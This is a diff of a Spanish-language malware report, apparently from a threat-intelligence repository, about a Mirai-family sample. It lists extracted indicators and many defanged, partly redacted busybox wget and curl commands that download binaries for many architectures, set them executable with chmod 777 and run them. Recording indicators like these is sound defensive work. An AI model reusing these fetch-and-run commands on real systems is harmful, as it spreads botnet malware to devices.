@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto asociado a la familia **mirai** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Cambio de permisos, Ejecución. Se asociaron 24 comandos observados o extraídos.
+Artefacto asociado a la familia **mirai** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Cambio de permisos, Ejecución. Se identificaron 24 comandos observados o extraídos. Se identificaron 37 indicadores técnicos.
+
 
 ## 🏷️ Clasificación
 
@@ -15,7 +16,7 @@ Artefacto asociado a la familia **mirai** con evidencia suficiente para atribuci
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T19:47:28+00:00`
+- **Registrado:** `2026-08-09T19:47:28.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -57,8 +58,8 @@ busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.mpsl; ch
 busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.ppc; chmod 777 MMaaRRiiOisecTanee.ppc; ./MMaaRRii
 busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.sh4; chmod 777 MMaaRRiiOisecTanee.sh4; ./MMaaRRii
 busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.spc; chmod 777 MMaaRRiiOisecTanee.spc; ./MMaaRRii
-busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.x86_64; chmod 777 MMaaRRiiOisecTanee.x86_64; ./MM
 busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.x86; chmod 777 MMaaRRiiOisecTanee.x86; ./MMaaRRii
+busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.x86_64; chmod 777 MMaaRRiiOisecTanee.x86_64; ./MM
 curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm; chmod 777 MMaaRRiiOisecTanee.arm; ./MMaaRRiiOisecTan
 curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm5; chmod 777 MMaaRRiiOisecTanee.arm5; ./MMaaRRiiOisecT
 curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm6; chmod 777 MMaaRRiiOisecTanee.arm6; ./MMaaRRiiOisecT
@@ -69,28 +70,27 @@ curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.mpsl; chmod 777 
 curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.ppc; chmod 777 MMaaRRiiOisecTanee.ppc; ./MMaaRRiiOisecTan
 curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.sh4; chmod 777 MMaaRRiiOisecTanee.sh4; ./MMaaRRiiOisecTan
 curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.spc; chmod 777 MMaaRRiiOisecTanee.spc; ./MMaaRRiiOisecTan
-curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.x86_64; chmod 777 MMaaRRiiOisecTanee.x86_64; ./MMaaRRiiOi
 curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.x86; chmod 777 MMaaRRiiOisecTanee.x86; ./MMaaRRiiOisecTan
+curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.x86_64; chmod 777 MMaaRRiiOisecTanee.x86_64; ./MMaaRRiiOi
 ```
 
 ## 🌐 Indicadores
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| ip | 94.154.43.XXX | static_analysis |
-| url | hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm; | strings |
 | url | hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm5; | strings |
-| url | hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm6; | strings |
-| url | hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm7; | strings |
+| url | hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm; | strings |
+| url | hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.spc; | strings |
+| url | hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.ppc; | strings |
 | url | hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.m68k; | strings |
 | url | hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.mips; | strings |
-| url | hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.mpsl; | strings |
-| url | hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.ppc; | strings |
+| url | hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm7; | strings |
 | url | hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.sh4; | strings |
-| url | hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.spc; | strings |
 | url | hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.x86_64; | strings |
+| url | hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm6; | strings |
+| url | hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.mpsl; | strings |
 | url | hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.x86; | strings |
-| hash | 67ea9188f82ea69ff63241d76861b96038a8f6a558a2c6ac3673c611aa81a2af | static_analysis |
+| ip | 94.154.43.XXX | static_analysis |
 | command | busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm; chmod 777 MMaaRRiiOisecTanee.arm; ./MMaaRRii | strings |
 | command | busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm5; chmod 777 MMaaRRiiOisecTanee.arm5; ./MMaaRR | strings |
 | command | busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm6; chmod 777 MMaaRRiiOisecTanee.arm6; ./MMaaRR | strings |
@@ -101,8 +101,8 @@ curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.x86; chmod 777 M
 | command | busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.ppc; chmod 777 MMaaRRiiOisecTanee.ppc; ./MMaaRRii | strings |
 | command | busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.sh4; chmod 777 MMaaRRiiOisecTanee.sh4; ./MMaaRRii | strings |
 | command | busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.spc; chmod 777 MMaaRRiiOisecTanee.spc; ./MMaaRRii | strings |
-| command | busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.x86_64; chmod 777 MMaaRRiiOisecTanee.x86_64; ./MM | strings |
 | command | busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.x86; chmod 777 MMaaRRiiOisecTanee.x86; ./MMaaRRii | strings |
+| command | busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.x86_64; chmod 777 MMaaRRiiOisecTanee.x86_64; ./MM | strings |
 | command | curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm; chmod 777 MMaaRRiiOisecTanee.arm; ./MMaaRRiiOisecTan | strings |
 | command | curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm5; chmod 777 MMaaRRiiOisecTanee.arm5; ./MMaaRRiiOisecT | strings |
 | command | curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm6; chmod 777 MMaaRRiiOisecTanee.arm6; ./MMaaRRiiOisecT | strings |
@@ -113,8 +113,9 @@ curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.x86; chmod 777 M
 | command | curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.ppc; chmod 777 MMaaRRiiOisecTanee.ppc; ./MMaaRRiiOisecTan | strings |
 | command | curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.sh4; chmod 777 MMaaRRiiOisecTanee.sh4; ./MMaaRRiiOisecTan | strings |
 | command | curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.spc; chmod 777 MMaaRRiiOisecTanee.spc; ./MMaaRRiiOisecTan | strings |
-| command | curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.x86_64; chmod 777 MMaaRRiiOisecTanee.x86_64; ./MMaaRRiiOi | strings |
 | command | curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.x86; chmod 777 MMaaRRiiOisecTanee.x86; ./MMaaRRiiOisecTan | strings |
+| command | curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.x86_64; chmod 777 MMaaRRiiOisecTanee.x86_64; ./MMaaRRiiOi | strings |
+| hash | 67ea9188f82ea69ff63241d76861b96038a8f6a558a2c6ac3673c611aa81a2af | static_analysis |
 
 ## 🔎 Triage
 
